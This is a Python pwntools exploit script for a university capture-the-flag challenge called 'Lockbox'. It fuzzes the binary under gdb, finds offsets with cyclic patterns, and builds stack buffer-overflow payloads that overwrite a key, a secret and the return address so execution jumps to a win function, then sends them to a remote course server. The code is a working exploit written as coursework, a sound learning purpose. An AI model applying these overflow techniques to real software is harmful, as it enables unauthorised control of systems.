from pwn import *
import re
import struct
import math

#############################################################
#	Lockbox_Pwn.py											#
#	Lindsay Von Tish (lmv9443@nyu.edu)						#
#	Pwn 1: Lockbox											#
#	02/28/2024												#
#############################################################

# A function to convert encoded input to a string and remove text format characters
#	Input: Encoded string
#	Output: Unencoded string
def cleanLine(ln):
	ansi_escape = re.compile(r'\x1B(?:[@-Z\\-_]|\[[0-?]*[ -/]*[@-~])')
	l = ansi_escape.sub('', str(ln, encoding='utf-8'))
	return l

# A function to print out part of the stack
#	Input: Connection, number of words to print
#	Output: N/A
def printStack(p, n):
	cmd = "x/" + str(n) + "x $sp"
	p.recv(timeout=0.05)
	#p.recvuntil("(gdb) ")
	p.sendline(cmd)

	t = math.ceil(n/4)
	#print(t)
	for i in range(0, t):
		d = p.recv(timeout=0.05)
		print(cleanLine(d))
	print("return")
	p.recv(timeout=0.05)
	return 0

# A function to print print the results of the "info registers" command
#	Input: Connection
#	Output: N/A
def getInfoRegs(p):
	cmd = "info registers"
	p.recv(timeout=0.05)
	p.sendline(cmd)
	while True:
		d = cleanLine(p.recv(timeout=0.05))
		print(d)
		if re.search("rip", d):
			break
	p.recv(timeout=0.05)
	print("return")
	return 0

# A function to increase the payload size until the data overwrites important values
#	Input: N/A
#	Output: N/A
def fuzz():
	p =  process('/bin/bash')
	p.sendline('gdb ./lockbox -q')
	data = 'A' * 16
	n = 0
	#p.sendline("break *0x000000000040127e")
	p.sendline("break *0x00000000004012a4")
	while True:
		print("############################")
		print("# Now with " + str(n + 16) + " As           #")
		print("############################")
		p.sendline("r")
		p.recvuntil(">")
		payload = data + 'A' * n + "\n"
		p.send(payload)
		#p.interactive()
		p.recvuntil("Breakpoint ")
		d = p.recv()
		print("Breakpoint " + cleanLine(d))
		printStack(p, 20)
		getInfoRegs(p)
		n += 1
		p.sendline("c")
		p.recv(timeout=0.05)
		if n == 23:
			break
		

# Builds a payload that will get us past the segfault
#	Input: N/A
#	Output: Payload
def keyPld():
	base = b"".join([struct.pack("B", 0x41) for i in range(0,16)])
	key = b"".join([struct.pack("B", 0x50), struct.pack("B", 0x40), struct.pack("B", 0x40), struct.pack("B", 0x00)])
	pad0 = b"".join([struct.pack("B", 0x00) for i in range(0,4)])
	return base + key + pad0

# A function to increase the payload size until the data overwrites important values
#	Input: N/A
#	Output: N/A
def testPld():
	base = b"".join([struct.pack("B", 0x41) for i in range(0,16)])
	data = b"".join([struct.pack("B", 0x50), struct.pack("B", 0x40), struct.pack("B", 0x40), struct.pack("B", 0x00)])
	d2 = b"".join([struct.pack("B", 0x00) for i in range(0,4)])
	d3 = cyclic(500)
	return base + data + d2 + d3


# Builds a payload that will force the program to jump to win when main returns
#	Input: N/A
#	Output: Payload
def winPld():
	base = b"".join([struct.pack("B", 0x41) for i in range(0,16)])
	key = b"".join([struct.pack("B", 0x50), struct.pack("B", 0x40), struct.pack("B", 0x40), struct.pack("B", 0x00)])
	pad0 = b"".join([struct.pack("B", 0x00) for i in range(0,4)])
	pad48 = cyclic(48)
	win = b"".join([struct.pack("B", 0xb6), struct.pack("B", 0x11), struct.pack("B", 0x40), struct.pack("B", 0x00)])
	return base + key + pad0 + pad48 + win + pad0


# A function to build the payload to get the secret correct
#	Input: N/A
#	Output: String containing payload
def secretPld():
	pad16 = b"".join([struct.pack("B", 0x41) for i in range(0,16)])
	keyAddr = b"".join([struct.pack("B", 0x50), struct.pack("B", 0x40), struct.pack("B", 0x40), struct.pack("B", 0x00)])
	pad0 = b"".join([struct.pack("B", 0x00) for i in range(0,4)])
	secret = b"".join([struct.pack("B", 0xdd), struct.pack("B", 0xb0), struct.pack("B", 0xdd), struct.pack("B", 0xda)])
	pad44 = b"".join([struct.pack("B", 0x42) for i in range(0,44)])
	win = b"".join([struct.pack("B", 0xb6), struct.pack("B", 0x11), struct.pack("B", 0x40), struct.pack("B", 0x00)])
	return pad16 + keyAddr + pad0 + secret + pad44 + win + pad0


# A function to find what part of the payload is being read as an address when main returns
#	Input: N/A
#	Output: N/A
def ripOffset():
	p = process('./lockbox')
	d = p.recvuntil(">")
	p.sendline(testPld())
	p.wait()
	cf = p.corefile
	stack = cf.rsp
	info("rsp = %#x", stack)
	pattern = cf.read(stack, 4)
	ripOffset = cyclic_find(pattern)
	info("rip offset = %d", ripOffset)	


# A function to find what part of the payload is leaking into eax
#	Input: N/A
#	Output: N/A
def eaxOffset():
	p =  process('/bin/bash')
	p.sendline('gdb ./lockbox -q')
	p.sendline("break *0x00000000004011ce")
	p.sendline("r")
	d = p.recvuntil(">")
	pld = winPld()
	p.sendline(pld)
	p.recvuntil("Breakpoint")
	p.recvuntil("(gdb) ")
	p.sendline("info registers eax")
	ln = cleanLine(p.recv())
	print(ln)
	l = re.split("\s+", ln)
	d = re.split("x", l[1])
	n = 2
	a = d[1]
	byt = [a[i:i+n] for i in range(0, len(a), n)]
	bytes = b"".join(struct.pack("B", int("0x"+byt[i], 16)) for i in range(0,4))
	print(str(bytes))
	eax = bytes
	eOffset = cyclic_find(eax)
	info("eax offset = %d", eOffset)
	p.close()


def sendPld():
	p =  process('/bin/bash')
	p.sendline('gdb ./lockbox -q')
	p.sendline("break * 0x00000000004011ce")
	p.sendline("r")
	d = p.recvuntil(">")
	pld = secretPld()
	p.sendline(pld)
	p.interactive()

def testRun():
	p =  process('./lockbox')
	d = p.recvuntil(">")
	pld = secretPld()
	p.sendline(pld)
	p.interactive()

# Host and port for the remote challenge
HOST = 'offsec-chalbroker.osiris.cyber.nyu.edu'
PORT = 1336

def remoteTest():
	p = remote(HOST, PORT)
	d = p.recvuntil(">")
	pld = secretPld()
	p.sendline(pld)
	p.interactive()

# Uncomment for Function
# remoteTest()
# sendPld()
# testRun()